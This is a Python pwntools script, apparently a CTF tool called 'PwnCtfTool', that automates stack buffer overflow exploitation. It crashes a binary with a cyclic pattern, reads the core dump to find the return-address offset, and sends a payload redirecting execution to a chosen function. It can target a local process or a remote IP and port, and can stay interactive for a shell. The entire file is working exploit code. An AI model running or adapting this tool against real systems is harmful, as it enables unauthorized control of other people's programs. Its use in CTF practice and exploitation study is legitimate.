#!/usr/bin/python3

from pwn import *
import os
import sys
import subprocess
import argparse
from termcolor import colored

context.log_level = "error"


## BANNER ##

def print_banner(title=""):
    print(colored ("""
    ____                 ________  __________            __
   / __ \_      ______  / ____/ /_/ __/_  __/___  ____  / /
  / /_/ / | /| / / __ \/ /   / __/ /_  / / / __ \/ __ \/ / 
 / ____/| |/ |/ / / / / /___/ /_/ __/ / / / /_/ / /_/ / /  
/_/     |__/|__/_/ /_/\____/\__/_/   /_/  \____/\____/_/   
                                                           

                By: DiegoAltF4 and Dbd4
""",'red'))
    total_len = 62
    if title:
        padding = total_len - len(title) - 4
        print("== {} {}\n".format(title, "=" * padding))
    else:
        print("{}\n".format("=" * total_len))



## MAIN PROGRAM ## 

if __name__ == "__main__":

    print_banner()

    parser = argparse.ArgumentParser(description="Auto PWN tool for CTF")
    parser.add_argument('-vv', action="store_true", dest="moreVerbose", required=False, help="Max Verbose (debug)")
    parser.add_argument('-v', action="store_true", dest="verbose", required=False, help="Verbose (info)")
    parser.add_argument('-g', action="store_true", dest="gdbDebug", required=False, help="Attach GDB")
    parser.add_argument('-f', action="store", dest="file", required=True, help="File to PWN")
    parser.add_argument('-t', action="store", dest="target", required=True, help="Target Function")
    parser.add_argument('--offset', action="store_true", dest="offset", required=False, help="Print offset Instruction Pointer")
    parser.add_argument('--shell', action="store_true", dest="shell", required=False, help="Stay interactive")
    parser.add_argument('--remote', action="store_true", dest="remote", required=False, help="Exploit remote server")


    results = parser.parse_args()
    file = context.binary = results.file
    target = results.target
    elf = ELF(file)

    if (results.verbose):
        context.log_level = "info"
    if (results.moreVerbose):
        context.log_level = "debug"

    assert target in elf.symbols
    target = elf.symbols.get(target)


    # Generate a cyclic pattern so that we can auto-find the offset
    payload = cyclic(1000)

    # Run the process once so that it crashes
    io = process(file)
    io.sendline(payload)
    io.wait()

    # Get the core dump
    core = Coredump('./core')

    # Our cyclic pattern should have been used as the crashing address

    if elf.elfclass==32:
        assert pack(core.eip) in payload
        offset=cyclic_find(core.eip)
    else:
        assert core.read(core.rsp,4) in payload
        offset=cyclic_find(core.read(core.rsp,4))

    if results.offset:
        print("\n[*] Offset: {}".format(offset))

    payload = flat({
        offset: target
    })

    
    if(results.remote):
        ip = input("IP/DOMAIN: ").strip()
        port = input("PORT: ")
        io = remote(ip,port)
    else:
        io = process(file)

    if results.gdbDebug:
        gdb.attach(io)

    io.send(payload)

    if results.shell:
        io.interactive()
    else:   
        io.sendline(b"\n"*5)
        print("\n[*] Possible flag:")
        print(colored ("\t{}\n".format(io.recvall()), "green"))
    
    del core
    os.remove('core')